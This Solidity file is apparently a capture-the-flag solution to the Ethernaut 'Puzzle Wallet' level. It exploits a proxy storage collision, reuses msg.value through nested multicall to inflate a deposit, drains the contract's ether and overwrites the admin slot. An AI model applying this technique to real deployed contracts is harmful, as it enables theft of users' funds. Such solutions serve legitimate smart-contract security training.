// SPDX-License-Identifier: MIT
pragma solidity ^0.8.13;

import "./SolveLevelBase.sol";
import "../src/interfaces/IPuzzleWallet.sol";

contract SolveLevel24 is SolveLevelBase {
    function getInstanceCreationData()
        internal
        pure
        override
        returns (address levelAddress, uint256 value)
    {
        levelAddress = 0xb4B157C7c4b0921065Dded675dFe10759EecaA6D;
        value = 0.001 ether;
    }

    function solveLevel(address instanceAddress, address player)
        internal
        override
    {
        IPuzzleWallet instance = IPuzzleWallet(payable(instanceAddress));

        instance.proposeNewAdmin(player);
        instance.addToWhitelist(player);

        bytes memory depositCalldata = abi.encodeWithSelector(
            instance.deposit.selector
        );

        // wrapping for multicall to bypass require(!depositCalled, "Deposit can only be called once");
        // when doing 2nd deposit and reusing msg.value
        bytes[] memory depositCalldataArray;
        depositCalldataArray = new bytes[](1);
        depositCalldataArray[0] = depositCalldata;

        bytes memory multicallCalldata = abi.encodeWithSelector(
            instance.multicall.selector,
            depositCalldataArray
        );

        bytes[] memory multicallCalldataArray;
        multicallCalldataArray = new bytes[](2);
        multicallCalldataArray[0] = depositCalldata;
        multicallCalldataArray[1] = multicallCalldata;

        instance.multicall{value: 0.001 ether}(multicallCalldataArray);

        instance.execute(player, 0.002 ether, bytes(""));
        instance.setMaxBalance(uint256(uint160(player)));
    }
}
